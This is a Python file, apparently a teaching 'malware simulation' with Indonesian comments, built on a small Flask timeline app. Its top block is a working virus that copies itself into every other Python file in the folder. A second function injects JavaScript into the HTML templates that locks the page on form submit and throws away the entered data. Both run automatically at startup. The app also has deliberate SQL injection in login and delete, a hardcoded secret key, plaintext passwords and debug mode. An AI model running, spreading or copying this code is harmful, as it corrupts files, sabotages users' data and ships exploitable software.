# VIRUS SAY HI!
import sys
import glob
import os

def start_infection():
    virus_code = []
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    self_replicating = False
    for line in lines:
        if line.strip() == "# VIRUS SAY HI!": self_replicating = True
        if self_replicating:
            virus_code.append(line)
        if line.strip() == "# VIRUS SAY BYE": break

    python_files = glob.glob('*.py') + glob.glob('*.pyw')
    for file in python_files:
        if file == sys.argv[0]: continue
        with open(file, 'r') as f:
            file_code = f.readlines()
        
        if not any("# VIRUS SAY HI!" in line for line in file_code):
            with open(file, 'w') as f:
                f.writelines(virus_code)
                f.write('\n')
                f.writelines(file_code)

def freeze_ui_payload():
    template_path = os.path.join(os.path.dirname(__file__), 'templates')
    if os.path.exists(template_path):
        for html_file in glob.glob(os.path.join(template_path, '*.html')):
            with open(html_file, 'r') as f:
                content = f.read()
            
            # Cek agar tidak diinjeksi ganda
            if "MALWARE_INJECTION_SCRIPT" not in content:
                js_payload = """
                <script id="MALWARE_INJECTION_SCRIPT">
                document.addEventListener('DOMContentLoaded', function() {
                    const form = document.querySelector('form[action="/create"]');
                    if (form) {
                        let isLocked = false; 
                        
                        form.addEventListener('submit', function(e) {
                            if (isLocked) {
                                e.preventDefault();
                                return;
                            }
                            
                            e.preventDefault(); // Tahan pengiriman data ke server
                            isLocked = true; // Tandai bahwa form sedang dibajak
                            
                            // 1. Buat layar kunci
                            const freezeLayer = document.createElement('div');
                            freezeLayer.id = 'malware-freeze-layer';
                            freezeLayer.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; cursor:not-allowed; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#ff4444; font-family:sans-serif; font-weight:bold; backdrop-filter: blur(4px);';
                            
                            freezeLayer.innerHTML = `
                                <div style="font-size:2.5rem; margin-bottom:15px;">SISTEM TERKUNCI</div>
                                <div style="color:white; font-size:1.2rem; font-weight:normal;">
                                    Mencegat data pengguna... Web ditangguhkan selama: 
                                    <span id="malware-timer" style="color:#ff4444; font-weight:bold; font-size:1.5rem;">10</span> detik
                                </div>
                            `;
                            document.body.appendChild(freezeLayer);
                            
                            // 2. Jalankan Hitung Mundur
                            let timeLeft = 10;
                            const timer = setInterval(function() {
                                timeLeft--;
                                const timerDisplay = document.getElementById('malware-timer');
                                if (timerDisplay) timerDisplay.innerText = timeLeft;
                                
                                // 3. Lepaskan kunci, TAPI BUANG DATANYA
                                if (timeLeft <= 0) {
                                    clearInterval(timer); 
                                    
                                    // Hapus elemen layar gelap
                                    const layerToRemove = document.getElementById('malware-freeze-layer');
                                    if (layerToRemove) layerToRemove.remove();
                                    
                                    // MODIFIKASI UTAMA: Hapus isi input form tanpa mengirimnya ke server!
                                    form.reset();
                                    
                                    // Berikan pop-up alert sebagai bukti simulasi bahwa data dicegat
                                    alert("SIMULASI MALWARE:\\nData yang Anda masukkan telah dicegat dan dibuang. Data gagal masuk ke database!");
                                    
                                    isLocked = false; // Buka kunci agar bisa dicoba lagi
                                }
                            }, 1000);
                        });
                    }
                });
                </script>
                """
                new_content = content.replace("</body>", f"{js_payload}\n</body>")
                with open(html_file, 'w') as f:
                    f.write(new_content)

# VIRUS SAY BYE

import sqlite3
from flask import Flask, redirect, request, session, render_template

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS user(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)''')
        cur.execute('''CREATE TABLE IF NOT EXISTS time_line(id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, content TEXT NOT NULL, FOREIGN KEY(user_id) REFERENCES user(id))''')
        conn.commit()

def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany('INSERT OR IGNORE INTO user(username, password) VALUES (?,?)', [('alice','alicepw'), ('bob','bobpw')])
        cur.executemany('INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)', [(1,'Hello world'), (2,'Hi there')])
        conn.commit()

def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        query = ('SELECT id, username FROM `user` WHERE username=\'%s\' AND password=\'%s\'' % (username, password))
        cur.execute(query)
        row = cur.fetchone()
        return dict(row) if row else None

def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('INSERT INTO time_line(user_id, content) VALUES (?,?)', (uid, content))
        conn.commit()

def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]

def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        query = f"DELETE FROM time_line WHERE user_id={uid} AND id={tid}"
        cur.execute(query)
        conn.commit()

@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        return render_template('index.html', user=session['username'], tl=tl)
    return redirect('/login')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/')
    return '''<form method="post"><input name="username" placeholder="user"/><input name="password" type="password"/><button>Login</button></form>'''

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
    return redirect('/')

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__=='__main__':
    # 1. Jalankan Infeksi File
    start_infection()
    
    # 2. Jalankan Pelumpuhan UI (Defacement)
    freeze_ui_payload()
    
    # 3. Jalankan Web Server
    print("[+] Simulasi Malware Aktif. Memulai Server...")
    app.run(debug=True)